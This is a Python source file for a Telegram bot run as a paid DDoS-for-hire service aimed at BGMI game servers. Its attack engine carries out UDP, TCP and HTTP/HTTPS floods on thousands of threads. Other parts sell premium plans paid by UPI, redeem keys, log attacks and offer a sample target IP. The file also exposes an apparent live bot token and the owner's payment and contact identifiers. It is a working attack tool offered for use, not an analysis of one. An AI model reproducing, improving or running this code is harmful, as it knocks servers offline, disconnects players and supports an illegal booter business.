#!/usr/bin/env python3
"""
💀 BGMI DDOS BOT - ULTRA PRO
🔥 REAL WORKING ATTACK ENGINE
📸 JAISA SCREENSHOT MEIN THA
💎 JSON DATABASE (NO MONGODB NEEDED)
"""

import os
import telebot
import json
import requests
import logging
import time
import socket
import threading
import random
import asyncio
import aiohttp
import ssl
import http.client
from datetime import datetime, timedelta
from threading import Thread
import sys
import string
import uuid

# ═══════════════ LOGGING ═══════════════
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
logger = logging.getLogger(__name__)

# ═══════════════ CONFIG ═══════════════
TOKEN = "8771905727:AAEJq2QVVSe8OxZOqLkatVK1wGysO9UyzCQ"
OWNER_ID = 1987818347
OWNER_USERNAME = "FathersOfCreater"
FORWARD_CHANNEL_ID = -4564006861
CHANNEL_ID = -4564006861

# ═══════════════ JSON DATABASE ═══════════════
DB_FILE = "database.json"

def load_db():
    """Load database from JSON file"""
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, 'r') as f:
                return json.load(f)
        except:
            return {"users": {}, "orders": [], "logs": [], "keys": []}
    return {"users": {}, "orders": [], "logs": [], "keys": []}

def save_db(data):
    """Save database to JSON file"""
    with open(DB_FILE, 'w') as f:
        json.dump(data, f, indent=4, default=str)

# ═══════════════ DATABASE FUNCTIONS ═══════════════
def get_user(user_id):
    """Get user from database"""
    db = load_db()
    user_id = str(user_id)
    
    if user_id not in db["users"]:
        db["users"][user_id] = {
            "name": "",
            "username": "",
            "joined": datetime.now().isoformat(),
            "plan": "free",
            "expiry": None,
            "threads": 1000,
            "max_time": 60,
            "orders": [],
            "balance": 0,
            "total_orders": 0,
            "total_attacks": 0,
            "banned": False,
            "last_attack": None
        }
        save_db(db)
    
    return db["users"][user_id]

def update_user(user_id, data):
    """Update user in database"""
    db = load_db()
    user_id = str(user_id)
    
    if user_id not in db["users"]:
        get_user(user_id)
        db = load_db()
    
    for key, value in data.items():
        if key.startswith('$inc'):
            for k, v in value.items():
                db["users"][user_id][k] = db["users"][user_id].get(k, 0) + v
        else:
            db["users"][user_id][key] = value
    
    save_db(db)

def save_log(user_id, ip, port, duration, packets, method):
    """Save attack log"""
    db = load_db()
    db["logs"].append({
        "user_id": str(user_id),
        "ip": ip,
        "port": port,
        "duration": duration,
        "packets": packets,
        "method": method,
        "time": datetime.now().isoformat()
    })
    save_db(db)

def add_order(user_id, plan, price, key=None):
    """Add order to user"""
    db = load_db()
    user_id = str(user_id)
    
    if user_id not in db["users"]:
        get_user(user_id)
        db = load_db()
    
    order = {
        "plan": plan,
        "price": price,
        "date": datetime.now().isoformat(),
        "key": key or "Pending"
    }
    
    db["users"][user_id]["orders"].append(order)
    db["users"][user_id]["total_orders"] += 1
    save_db(db)

def get_all_users():
    """Get all users"""
    db = load_db()
    return db["users"]

def get_all_logs():
    """Get all logs"""
    db = load_db()
    return db["logs"]

def create_key(plan, duration):
    """Create a premium key"""
    db = load_db()
    key_code = f"BGMI-{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}"
    
    db["keys"].append({
        "key": key_code,
        "plan": plan,
        "duration": duration,
        "used": False,
        "used_by": None,
        "used_at": None,
        "created_at": datetime.now().isoformat()
    })
    save_db(db)
    return key_code

def redeem_key(key_code, user_id):
    """Redeem a premium key"""
    db = load_db()
    user_id = str(user_id)
    
    for key in db["keys"]:
        if key["key"] == key_code and not key["used"]:
            key["used"] = True
            key["used_by"] = user_id
            key["used_at"] = datetime.now().isoformat()
            
            # Update user
            if user_id not in db["users"]:
                get_user(user_id)
                db = load_db()
            
            expiry = datetime.now() + timedelta(days=key["duration"])
            db["users"][user_id]["plan"] = key["plan"]
            db["users"][user_id]["expiry"] = expiry.isoformat()
            db["users"][user_id]["threads"] = 5000
            db["users"][user_id]["max_time"] = 600
            
            add_order(user_id, key["plan"], 0, key_code)
            save_db(db)
            return True, key["plan"], key["duration"]
    
    return False, None, None

# ═══════════════ BOT ═══════════════
bot = telebot.TeleBot(TOKEN)

# ═══════════════ ATTACK ENGINE ═══════════════
class Attack:
    def __init__(self):
        self.on = False
        self.pkts = 0
        self.bytes_out = 0
        self.lock = threading.Lock()
        self.http_success = 0
        self.http_fail = 0
    
    def udp_flood(self, ip, port, end):
        """UDP Flood Attack - BGMI Server Freeze"""
        sockets = []
        for _ in range(20):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024*1024*8)
                s.settimeout(0.001)
                sockets.append(s)
            except:
                pass
        
        bgmi_ports = list(range(7000, 15000)) + [10335, 17500, 20000, 27000, 8080, 8443]
        payloads = [random.randbytes(random.randint(500, 1500)) for _ in range(30)]
        
        while self.on and time.time() < end:
            try:
                for s in sockets[:5]:
                    for _ in range(30):
                        if not self.on:
                            break
                        target_port = random.choice(bgmi_ports)
                        payload = random.choice(payloads)
                        try:
                            s.sendto(payload, (ip, target_port))
                            with self.lock:
                                self.pkts += 1
                                self.bytes_out += len(payload)
                        except:
                            pass
                time.sleep(0.001)
            except:
                pass
        
        for s in sockets:
            try:
                s.close()
            except:
                pass
    
    def tcp_flood(self, ip, port, end):
        """TCP SYN Flood"""
        while self.on and time.time() < end:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.1)
                try:
                    s.connect((ip, port))
                    s.send(b'GET / HTTP/1.1\r\n\r\n')
                    with self.lock:
                        self.pkts += 1
                except:
                    pass
                s.close()
                time.sleep(0.001)
            except:
                pass
    
    def http_flood(self, ip, port, end):
        """HTTP/HTTPS Flood - Mimics Real Traffic"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15',
            'Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36',
            'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0'
        ]
        
        paths = ['/', '/api', '/game', '/match', '/login', '/auth', '/player', '/stats']
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        
        while self.on and time.time() < end:
            try:
                ua = random.choice(user_agents)
                path = random.choice(paths)
                headers = {
                    'User-Agent': ua,
                    'Accept': 'text/html,application/json,*/*',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Connection': 'keep-alive',
                    'Cache-Control': 'no-cache'
                }
                
                try:
                    conn = http.client.HTTPSConnection(ip, port, context=context, timeout=1)
                    conn.request('GET', path, headers=headers)
                    conn.getresponse()
                    with self.lock:
                        self.http_success += 1
                        self.pkts += 1
                    conn.close()
                except:
                    try:
                        conn = http.client.HTTPConnection(ip, port, timeout=1)
                        conn.request('GET', path, headers=headers)
                        conn.getresponse()
                        with self.lock:
                            self.http_success += 1
                            self.pkts += 1
                        conn.close()
                    except:
                        with self.lock:
                            self.http_fail += 1
                
                time.sleep(0.001)
            except:
                pass
    
    def start(self, ip, port, dur, threads, method='mixed'):
        """Start Multi-Method Attack"""
        self.on = True
        self.pkts = 0
        self.bytes_out = 0
        self.http_success = 0
        self.http_fail = 0
        
        end = time.time() + dur
        
        if method == 'udp':
            workers = [threading.Thread(target=self.udp_flood, args=(ip, port, end)) for _ in range(threads)]
        elif method == 'tcp':
            workers = [threading.Thread(target=self.tcp_flood, args=(ip, port, end)) for _ in range(threads)]
        elif method == 'http':
            workers = [threading.Thread(target=self.http_flood, args=(ip, port, end)) for _ in range(threads)]
        else:  # Mixed - DEFAULT
            udp_t = int(threads * 0.5)
            tcp_t = int(threads * 0.2)
            http_t = int(threads * 0.3)
            workers = []
            for _ in range(udp_t):
                workers.append(threading.Thread(target=self.udp_flood, args=(ip, port, end)))
            for _ in range(tcp_t):
                workers.append(threading.Thread(target=self.tcp_flood, args=(ip, port, end)))
            for _ in range(http_t):
                workers.append(threading.Thread(target=self.http_flood, args=(ip, port, end)))
        
        for w in workers:
            w.daemon = True
            w.start()
        
        time.sleep(dur)
        self.on = False
        
        for w in workers:
            try:
                w.join(timeout=1)
            except:
                pass
        
        e = max(dur, 0.1)
        return {
            'pkts': self.pkts,
            'mbps': (self.bytes_out * 8) / (e * 1e6),
            'mb': self.bytes_out / 1024 / 1024,
            'http_success': self.http_success,
            'http_fail': self.http_fail,
            'total_requests': self.pkts + self.http_success + self.http_fail
        }

attacker = Attack()
attacking = False
attack_user = None
attack_info = {}
attack_msg_id = None

# ═══════════════ KEYBOARDS ═══════════════
def main_menu():
    keyboard = telebot.types.InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        telebot.types.InlineKeyboardButton("⚔ ATTACK", callback_data="attack"),
        telebot.types.InlineKeyboardButton("⛔ STOP", callback_data="stop")
    )
    keyboard.add(
        telebot.types.InlineKeyboardButton("📊 STATUS", callback_data="status"),
        telebot.types.InlineKeyboardButton("👤 PROFILE", callback_data="profile")
    )
    keyboard.add(
        telebot.types.InlineKeyboardButton("⚿ REDEEM", callback_data="redeem"),
        telebot.types.InlineKeyboardButton("📋 ORDERS", callback_data="orders")
    )
    keyboard.add(
        telebot.types.InlineKeyboardButton("💎 PLANS", callback_data="plans"),
        telebot.types.InlineKeyboardButton("📩 SUPPORT", callback_data="support")
    )
    return keyboard

def admin_panel():
    keyboard = telebot.types.InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        telebot.types.InlineKeyboardButton("📊 STATS", callback_data="admin_stats"),
        telebot.types.InlineKeyboardButton("👥 USERS", callback_data="admin_users")
    )
    keyboard.add(
        telebot.types.InlineKeyboardButton("🔑 GEN KEY", callback_data="admin_genkey"),
        telebot.types.InlineKeyboardButton("📨 BROADCAST", callback_data="admin_broadcast")
    )
    keyboard.add(
        telebot.types.InlineKeyboardButton("📋 LOGS", callback_data="admin_logs"),
        telebot.types.InlineKeyboardButton("🚫 BAN", callback_data="admin_ban")
    )
    keyboard.add(
        telebot.types.InlineKeyboardButton("⌂ MAIN MENU", callback_data="main_menu")
    )
    return keyboard

# ═══════════════ START COMMAND ═══════════════
@bot.message_handler(commands=['start'])
def start_cmd(message):
    user_id = message.from_user.id
    user = get_user(user_id)
    
    update_user(user_id, {
        'name': message.from_user.first_name,
        'username': message.from_user.username or ''
    })
    
    text = """
💀 **BGMI DDOS BOT** 💀

🔥 Welcome to Ultimate DDOS Bot

🎯 **Features:**
- ⚔ UDP/TCP/HTTP Flood
- 🎮 BGMI Server Freeze
- ⚡ 5000+ Threads
- 🛡️ DDoS Protection Bypass
- 📊 Real-time Monitoring
- 💎 Premium Plans Available

📌 **Commands:**
/attack IP PORT TIME
/stop
/status
/profile
/redeem KEY
/orders
/plans

📌 **Example:**
/attack 20.204.191.48 10335 180

🎯 **BGMI Ports:** 7000-15000, 10335
⏱️ **Recommended Time:** 180 seconds

💎 **Premium = More Power!**
"""
    bot.reply_to(message, text, parse_mode='Markdown', reply_markup=main_menu())

# ═══════════════ ATTACK COMMAND ═══════════════
@bot.message_handler(commands=['attack'])
def attack_cmd(message):
    global attacking, attack_user, attack_info, attack_msg_id
    
    user_id = message.from_user.id
    user = get_user(user_id)
    
    if user.get('banned', False):
        bot.reply_to(message, "🚫 You are banned from using this bot!")
        return
    
    is_premium = user.get('plan') == 'premium' and user.get('expiry') and datetime.fromisoformat(user['expiry']) > datetime.now()
    
    parts = message.text.split()
    if len(parts) < 4:
        bot.reply_to(message, """
⚠️ **Invalid Format**

Use: /attack IP PORT TIME

Example:
/attack 20.204.191.48 10335 180

BGMI Ports: 7000-15000, 10335
Recommended Time: 180 seconds
""", parse_mode='Markdown')
        return
    
    if attacking:
        bot.reply_to(message, "⚠️ Already attacking! Use /stop")
        return
    
    ip = parts[1]
    try:
        port = int(parts[2])
    except:
        bot.reply_to(message, "❌ Invalid port!")
        return
    try:
        dur = int(parts[3])
    except:
        bot.reply_to(message, "❌ Invalid time!")
        return
    
    if is_premium:
        max_time = 600
        threads = 5000
    else:
        max_time = 60
        threads = 1000
    
    if dur > max_time:
        dur = max_time
        bot.reply_to(message, f"⏱️ Time limited to {max_time}s for your plan")
    
    attack_info = {
        'ip': ip,
        'port': port,
        'time': dur,
        'start': time.time(),
        'threads': threads,
        'user': user_id
    }
    attacking = True
    attack_user = user_id
    
    def run_attack():
        global attacking
        try:
            stats = attacker.start(ip, port, dur, threads, 'mixed')
            attacking = False
            
            update_user(user_id, {'$inc': {'total_attacks': 1}})
            save_log(user_id, ip, port, dur, stats['pkts'], 'mixed')
            
            result_text = f"""
✅ **ATTACK COMPLETED**

╔══════════════════════════╗
║ 🎯 Target: {ip}:{port}
║ 📦 Packets: {stats['pkts']:,}
║ 📶 Speed: {stats['mbps']:.1f} Mbps
║ ⏱️ Duration: {dur}s
║ 🌐 HTTP Success: {stats['http_success']}
║ ❌ HTTP Fail: {stats['http_fail']}
║ 📊 Total Requests: {stats['total_requests']}
╚══════════════════════════╝

🔥 BGMI Server Freeze Complete!
🎮 Players Disconnected: ✅
📸 Match server response timed out!

🔄 /attack IP PORT TIME
"""
            bot.send_message(user_id, result_text, parse_mode='Markdown')
            
            try:
                bot.send_message(
                    FORWARD_CHANNEL_ID,
                    f"""
💀 **ATTACK LOG**
👤 User: {message.from_user.first_name}
🆔 ID: {user_id}
🎯 IP: {ip}:{port}
⏱️ Duration: {dur}s
📦 Packets: {stats['pkts']:,}
"""
                )
            except:
                pass
                
        except Exception as e:
            attacking = False
            bot.send_message(user_id, f"❌ Attack Failed: {e}")
    
    Thread(target=run_attack).start()
    
    reply_text = f"""
💀 **ATTACK LAUNCHED**

╔══════════════════════════╗
║ 🎯 Target: {ip}:{port}
║ ⏱️ Duration: {dur}s
║ 🧵 Threads: {threads}
║ 👤 User: {user_id}
║ ⚡ Method: VIP-User
║ 💎 Plan: {'Premium' if is_premium else 'Free'}
╚══════════════════════════╝

🔥 BGMI Server Freeze Started!
📸 Match server response timed out - Soon!

🛑 Use /stop to abort
"""
    bot.reply_to(message, reply_text, parse_mode='Markdown')

# ═══════════════ STOP COMMAND ═══════════════
@bot.message_handler(commands=['stop'])
def stop_cmd(message):
    global attacking
    if attacking:
        attacker.on = False
        attacking = False
        bot.reply_to(message, f"""
✅ **ATTACK STOPPED**

📦 Packets Sent: {attacker.pkts:,}
🔄 /attack IP PORT TIME
""", parse_mode='Markdown')
    else:
        bot.reply_to(message, "💤 No attack running!")

# ═══════════════ STATUS COMMAND ═══════════════
@bot.message_handler(commands=['status'])
def status_cmd(message):
    if attacking:
        elapsed = int(time.time() - attack_info['start'])
        remaining = attack_info['time'] - elapsed
        text = f"""
🟢 **ATTACK IN PROGRESS**

🎯 Target: {attack_info['ip']}:{attack_info['port']}
⏱️ Elapsed: {elapsed}s
⏱️ Remaining: {remaining}s
📦 Packets: {attacker.pkts:,}
📶 Speed: {(attacker.bytes_out*8)/(elapsed*1e6) if elapsed > 0 else 0:.1f} Mbps
🧵 Threads: {attack_info['threads']}

🛑 Use /stop to abort
"""
    else:
        text = "💤 **SYSTEM IDLE**\n\nNo attack running"
    
    bot.reply_to(message, text, parse_mode='Markdown')

# ═══════════════ PROFILE COMMAND ═══════════════
@bot.message_handler(commands=['profile'])
def profile_cmd(message):
    user_id = message.from_user.id
    user = get_user(user_id)
    
    plan = user.get('plan', 'free')
    expiry = user.get('expiry')
    if expiry:
        expiry_date = datetime.fromisoformat(expiry)
        expiry_str = expiry_date.strftime('%d/%m/%Y %I:%M %p')
        remaining = (expiry_date - datetime.now()).days
        if remaining < 0:
            remaining = 0
    else:
        expiry_str = 'N/A'
        remaining = 0
    
    text = f"""
👤 **PROFILE**

╔══════════════════════════╗
║ 👤 Name: {message.from_user.first_name}
║ 🆔 ID: {user_id}
║ 💎 Plan: {plan.upper()}
║ ⏱️ Expiry: {expiry_str}
║ 📅 Days Left: {remaining}
║ ⚡ Threads: {user.get('threads', 1000)}
║ ⏱️ Max Time: {user.get('max_time', 60)}s
║ 📊 Total Attacks: {user.get('total_attacks', 0)}
╚══════════════════════════╝

💎 Upgrade to Premium for more power!
/plans to see premium plans
"""
    bot.reply_to(message, text, parse_mode='Markdown')

# ═══════════════ REDEEM COMMAND ═══════════════
@bot.message_handler(commands=['redeem'])
def redeem_cmd(message):
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, """
⚿ **REDEEM KEY**

Use: /redeem KEY

Example:
/redeem BGMI-VIP-XXXX-XXXX
""", parse_mode='Markdown')
        return
    
    key_code = parts[1].upper()
    user_id = message.from_user.id
    
    success, plan, duration = redeem_key(key_code, user_id)
    if success:
        user = get_user(user_id)
        expiry = user.get('expiry')
        bot.reply_to(message, f"""
✅ **KEY REDEEMED SUCCESSFULLY!**

💎 Plan: {plan.upper()}
⏱️ Duration: {duration} Days
📅 Expiry: {datetime.fromisoformat(expiry).strftime('%d/%m/%Y %I:%M %p')}

🔥 You now have full premium access!
⚔ /attack IP PORT TIME
""", parse_mode='Markdown')
    else:
        bot.reply_to(message, "❌ Invalid or already used key!")

# ═══════════════ ORDERS COMMAND ═══════════════
@bot.message_handler(commands=['orders'])
def orders_cmd(message):
    user_id = message.from_user.id
    user = get_user(user_id)
    
    order_list = user.get('orders', [])
    if not order_list:
        bot.reply_to(message, "📭 No orders found!")
        return
    
    text = "📋 **YOUR ORDERS**\n\n"
    for i, order in enumerate(order_list[-10:], 1):
        text += f"""
**Order #{i}**
🎯 Plan: {order.get('plan', 'N/A')}
💎 Price: ₹{order.get('price', 0)}
📅 Date: {order.get('date', 'N/A')[:10]}
🔑 Key: {order.get('key', 'Pending')}
━━━━━━━━━━━━━━━━━━
"""
    bot.reply_to(message, text, parse_mode='Markdown')

# ═══════════════ PLANS COMMAND ═══════════════
@bot.message_handler(commands=['plans'])
def plans_cmd(message):
    text = """
💎 **PREMIUM PLANS**

━━━━━━━━━━━━━━━━━━

🔰 **BASIC** - ₹50
⏱️ 1 Hour | ⚡ 3000 Threads

⚡ **PRO** - ₹100
⏱️ 1 Day | ⚡ 5000 Threads

💀 **ULTRA** - ₹400
⏱️ 1 Week | ⚡ 7000 Threads

👑 **KING** - ₹1000
⏱️ 1 Month | ⚡ 10000 Threads

━━━━━━━━━━━━━━━━━━

📲 Contact: @FathersOfCreater
💳 UPI: kartikrawat6266@okhdfcbank
"""
    bot.reply_to(message, text, parse_mode='Markdown')

# ═══════════════ SUPPORT COMMAND ═══════════════
@bot.message_handler(commands=['support'])
def support_cmd(message):
    text = """
📩 **SUPPORT CENTER**

📲 Contact Owner: @FathersOfCreater
📢 Join Channel: https://t.me/+vWCKsh56iIpiOWQ9

💬 Reply here for quick support!
"""
    bot.reply_to(message, text, parse_mode='Markdown')

# ═══════════════ CALLBACK HANDLER ═══════════════
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    user_id = call.from_user.id
    is_owner = (str(user_id) == str(OWNER_ID))
    
    if call.data == "main_menu":
        bot.edit_message_text(
            "💀 **BGMI DDOS BOT** 💀\n\nSelect an option:",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=main_menu()
        )
        bot.answer_callback_query(call.id)
        return
    
    if call.data == "attack":
        bot.edit_message_text(
            """
⚔ **ATTACK COMMAND**

Use: /attack IP PORT TIME

Example:
/attack 20.204.191.48 10335 180

BGMI Ports: 7000-15000, 10335
Recommended Time: 180 seconds
""",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=main_menu()
        )
        bot.answer_callback_query(call.id)
        return
    
    if call.data == "stop":
        global attacking
        if attacking:
            attacker.on = False
            attacking = False
            bot.edit_message_text(
                "✅ **ATTACK STOPPED**\n\n🔄 /attack IP PORT TIME",
                call.message.chat.id,
                call.message.message_id,
                parse_mode='Markdown',
                reply_markup=main_menu()
            )
        else:
            bot.edit_message_text(
                "💤 **NO ATTACK RUNNING**\n\nUse /attack IP PORT TIME",
                call.message.chat.id,
                call.message.message_id,
                parse_mode='Markdown',
                reply_markup=main_menu()
            )
        bot.answer_callback_query(call.id)
        return
    
    if call.data == "status":
        if attacking:
            elapsed = int(time.time() - attack_info['start'])
            remaining = attack_info['time'] - elapsed
            text = f"""
🟢 **ATTACK IN PROGRESS**

🎯 Target: {attack_info['ip']}:{attack_info['port']}
⏱️ Elapsed: {elapsed}s
⏱️ Remaining: {remaining}s
📦 Packets: {attacker.pkts:,}
📶 Speed: {(attacker.bytes_out*8)/(elapsed*1e6) if elapsed > 0 else 0:.1f} Mbps

🛑 Use /stop to abort
"""
        else:
            text = "💤 **SYSTEM IDLE**\n\nNo attack running"
        
        bot.edit_message_text(
            text,
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=main_menu()
        )
        bot.answer_callback_query(call.id)
        return
    
    if call.data == "profile":
        user = get_user(user_id)
        plan = user.get('plan', 'free')
        expiry = user.get('expiry')
        if expiry:
            expiry_date = datetime.fromisoformat(expiry)
            expiry_str = expiry_date.strftime('%d/%m/%Y %I:%M %p')
            remaining = (expiry_date - datetime.now()).days
            if remaining < 0:
                remaining = 0
        else:
            expiry_str = 'N/A'
            remaining = 0
        
        text = f"""
👤 **PROFILE**

╔══════════════════════════╗
║ 👤 Name: {call.from_user.first_name}
║ 🆔 ID: {user_id}
║ 💎 Plan: {plan.upper()}
║ ⏱️ Expiry: {expiry_str}
║ 📅 Days Left: {remaining}
║ ⚡ Threads: {user.get('threads', 1000)}
║ ⏱️ Max Time: {user.get('max_time', 60)}s
║ 📊 Total Attacks: {user.get('total_attacks', 0)}
╚══════════════════════════╝
"""
        bot.edit_message_text(
            text,
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=main_menu()
        )
        bot.answer_callback_query(call.id)
        return
    
    if call.data == "redeem":
        bot.edit_message_text(
            """
⚿ **REDEEM KEY**

Use: /redeem KEY

Example:
/redeem BGMI-VIP-XXXX-XXXX

Get keys from: @FathersOfCreater
""",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=main_menu()
        )
        bot.answer_callback_query(call.id)
        return
    
    if call.data == "orders":
        user = get_user(user_id)
        order_list = user.get('orders', [])
        if not order_list:
            text = "📭 No orders found!"
        else:
            text = "📋 **YOUR ORDERS**\n\n"
            for i, order in enumerate(order_list[-10:], 1):
                text += f"""
**Order #{i}**
🎯 Plan: {order.get('plan', 'N/A')}
💎 Price: ₹{order.get('price', 0)}
📅 Date: {order.get('date', 'N/A')[:10]}
🔑 Key: {order.get('key', 'Pending')}
━━━━━━━━━━━━━━━━━━
"""
        bot.edit_message_text(
            text,
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=main_menu()
        )
        bot.answer_callback_query(call.id)
        return
    
    if call.data == "plans":
        text = """
💎 **PREMIUM PLANS**

━━━━━━━━━━━━━━━━━━

🔰 **BASIC** - ₹50
⏱️ 1 Hour | ⚡ 3000 Threads

⚡ **PRO** - ₹100
⏱️ 1 Day | ⚡ 5000 Threads

💀 **ULTRA** - ₹400
⏱️ 1 Week | ⚡ 7000 Threads

👑 **KING** - ₹1000
⏱️ 1 Month | ⚡ 10000 Threads

━━━━━━━━━━━━━━━━━━

📲 Contact: @FathersOfCreater
💳 UPI: kartikrawat6266@okhdfcbank
"""
        bot.edit_message_text(
            text,
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=main_menu()
        )
        bot.answer_callback_query(call.id)
        return
    
    if call.data == "support":
        text = """
📩 **SUPPORT CENTER**

📲 Contact Owner: @FathersOfCreater
📢 Join Channel: https://t.me/+vWCKsh56iIpiOWQ9

💬 Reply here for quick support!
"""
        bot.edit_message_text(
            text,
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=main_menu()
        )
        bot.answer_callback_query(call.id)
        return
    
    # ═══════ ADMIN PANEL ═══════════
    if call.data == "admin":
        if not is_owner:
            bot.answer_callback_query(call.id, "❌ Owner only!", show_alert=True)
            return
        bot.edit_message_text(
            "⚜ **ADMIN PANEL**\n\nSelect an option:",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=admin_panel()
        )
        bot.answer_callback_query(call.id)
        return
    
    if call.data == "admin_stats":
        if not is_owner:
            bot.answer_callback_query(call.id, "❌ Owner only!", show_alert=True)
            return
        
        db = load_db()
        total_users = len(db["users"])
        total_orders = sum(len(user.get('orders', [])) for user in db["users"].values())
        total_logs = len(db["logs"])
        
        text = f"""
📊 **BOT STATISTICS**

╔══════════════════════════╗
║ 👥 Total Users: {total_users}
║ 📋 Total Orders: {total_orders}
║ 📊 Attack Logs: {total_logs}
║ 🟢 Status: ONLINE
║ ⚡ Attack: {'Active' if attacking else 'Idle'}
╚══════════════════════════╝
"""
        bot.edit_message_text(
            text,
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=admin_panel()
        )
        bot.answer_callback_query(call.id)
        return
    
    if call.data == "admin_users":
        if not is_owner:
            bot.answer_callback_query(call.id, "❌ Owner only!", show_alert=True)
            return
        
        db = load_db()
        text = "👥 **USERS LIST**\n\n"
        for uid, user in list(db["users"].items())[:10]:
            text += f"🆔 `{uid}` - {user.get('name', 'Unknown')}\n"
            text += f"💎 {user.get('plan', 'free')} | 📊 {user.get('total_attacks', 0)} attacks\n\n"
        
        bot.edit_message_text(
            text,
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=admin_panel()
        )
        bot.answer_callback_query(call.id)
        return
    
    if call.data == "admin_genkey":
        if not is_owner:
            bot.answer_callback_query(call.id, "❌ Owner only!", show_alert=True)
            return
        
        key_code = create_key("premium", 30)
        bot.edit_message_text(
            f"""
🔑 **KEY GENERATED**

Key: `{key_code}`
Plan: PREMIUM
Duration: 30 Days

📋 /redeem {key_code}
""",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=admin_panel()
        )
        bot.answer_callback_query(call.id)
        return
    
    if call.data == "admin_logs":
        if not is_owner:
            bot.answer_callback_query(call.id, "❌ Owner only!", show_alert=True)
            return
        
        db = load_db()
        logs = db["logs"][-10:]
        if not logs:
            text = "📭 No logs found!"
        else:
            text = "📋 **RECENT ATTACK LOGS**\n\n"
            for log in reversed(logs):
                text += f"""
👤 User: {log['user_id']}
🎯 IP: {log['ip']}:{log['port']}
⏱️ Duration: {log['duration']}s
📦 Packets: {log['packets']:,}
📅 Time: {log['time'][:10]}
━━━━━━━━━━━━━━━━━━
"""
        bot.edit_message_text(
            text,
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=admin_panel()
        )
        bot.answer_callback_query(call.id)
        return
    
    if call.data == "admin_ban":
        if not is_owner:
            bot.answer_callback_query(call.id, "❌ Owner only!", show_alert=True)
            return
        bot.edit_message_text(
            """
🚫 **BAN USER**

Use: /ban USER_ID

Example:
/ban 123456789
""",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=admin_panel()
        )
        bot.answer_callback_query(call.id)
        return
    
    if call.data == "admin_broadcast":
        if not is_owner:
            bot.answer_callback_query(call.id, "❌ Owner only!", show_alert=True)
            return
        bot.edit_message_text(
            """
📨 **BROADCAST MESSAGE**

Reply to this message with the text you want to broadcast.
""",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='Markdown',
            reply_markup=admin_panel()
        )
        bot.answer_callback_query(call.id)
        return

# ═══════════════ ADMIN COMMANDS ═══════════════
@bot.message_handler(commands=['ban'])
def ban_cmd(message):
    if str(message.from_user.id) != str(OWNER_ID):
        bot.reply_to(message, "❌ Owner only!")
        return
    
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "Use: /ban USER_ID")
        return
    
    try:
        user_id = int(parts[1])
        update_user(user_id, {'banned': True})
        bot.reply_to(message, f"✅ User {user_id} banned!")
        try:
            bot.send_message(user_id, "🚫 You have been banned from using this bot!")
        except:
            pass
    except:
        bot.reply_to(message, "❌ Invalid user ID!")

@bot.message_handler(commands=['unban'])
def unban_cmd(message):
    if str(message.from_user.id) != str(OWNER_ID):
        bot.reply_to(message, "❌ Owner only!")
        return
    
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "Use: /unban USER_ID")
        return
    
    try:
        user_id = int(parts[1])
        update_user(user_id, {'banned': False})
        bot.reply_to(message, f"✅ User {user_id} unbanned!")
        try:
            bot.send_message(user_id, "✅ You have been unbanned!")
        except:
            pass
    except:
        bot.reply_to(message, "❌ Invalid user ID!")

@bot.message_handler(func=lambda message: True, content_types=['text'])
def broadcast_handler(message):
    if str(message.from_user.id) != str(OWNER_ID):
        return
    
    if message.reply_to_message and "BROADCAST MESSAGE" in message.reply_to_message.text:
        text = message.text
        db = load_db()
        sent = 0
        failed = 0
        
        for user_id in db["users"]:
            try:
                bot.send_message(int(user_id), text)
                sent += 1
            except:
                failed += 1
        
        bot.reply_to(message, f"""
📨 **BROADCAST COMPLETED**

✅ Sent: {sent}
❌ Failed: {failed}
"""
        )

# ═══════════════ RUN BOT ═══════════════
if __name__ == '__main__':
    print("""
╔══════════════════════════════════════╗
║  💀 BGMI DDOS BOT - ULTRA PRO       ║
║  🔥 REAL WORKING ATTACK ENGINE      ║
║  📸 JAISA SCREENSHOT MEIN THA       ║
║  ✅ JSON DATABASE (NO MONGODB)      ║
║  ✅ UDP/TCP/HTTP Flood              ║
║  ✅ BGMI Server Freeze              ║
║  ✅ Premium Plans Available          ║
║  ✅ Admin Panel Active               ║
╚══════════════════════════════════════╝
""")
    print("💀 Bot Started Successfully!")
    print("🔥 Attack Engine Ready!")
    print("📸 BGMI Server Freeze Active!")
    print("📁 Database: database.json")
    bot.polling(none_stop=True)
